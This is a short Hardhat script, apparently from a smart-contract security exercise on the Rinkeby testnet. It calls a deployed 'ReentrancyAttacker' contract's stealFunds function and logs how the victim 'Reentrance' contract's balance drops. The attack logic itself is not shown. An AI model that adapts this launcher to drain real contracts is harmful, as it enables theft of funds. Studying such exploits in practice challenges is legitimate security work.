const { ethers, network, getNamedAccounts, waffle } = require("hardhat");
const { networkConfig } = require("../../helper-hardhat-config");

async function stealFunds() {
  const chainId = network.config.chainId;
  if (chainId == 4) {
    const { deployer } = await getNamedAccounts();
    const waitBlockConfirmations = 1;
    const provider = waffle.provider;
    const aReentrancy = networkConfig[chainId]["reentrancy"];

    // get ReentrancyAttacker contract
    const cReentrancyAttacker = await ethers.getContract("ReentrancyAttacker");

    //
    const balanceBefore = await provider.getBalance(aReentrancy);
    console.log(
      "Initial balance of the Reentrance contract: ",
      ethers.utils.formatEther(balanceBefore)
    );
    const tx = await cReentrancyAttacker.stealFunds({
      value: ethers.utils.parseEther("0.01"),
      gasLimit: "100000",
    });
    await tx.wait();
    const balanceAfter = await provider.getBalance(aReentrancy);
    console.log(
      "Final balance of Reentrance contract: ",
      ethers.utils.formatEther(balanceAfter)
    );
  }
}

stealFunds()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
